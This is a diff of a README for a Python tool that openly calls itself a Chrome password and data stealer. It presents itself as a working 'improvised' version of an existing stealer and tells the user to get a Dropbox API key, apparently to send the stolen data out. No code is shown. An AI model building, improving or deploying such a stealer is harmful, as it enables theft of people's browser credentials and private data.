@@ -3,7 +3,7 @@ A python application to steal chrome data and push it back to you
 Finds the data , pushes it back to you.
 
 
-An Improvised Version of [Shaskank Chandak's Password Stealer](https://github.com/shashankchandak/PasswordStealer).
+An Improvised Version of [Shaskank Chandak's Password Stealer](https://github.com/shashankchandak/PasswordStealer). What's improved you may ask? That version doesn't work! 
 
 ### Before you begin
 - Get an DropBox API key from [Here](https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/)
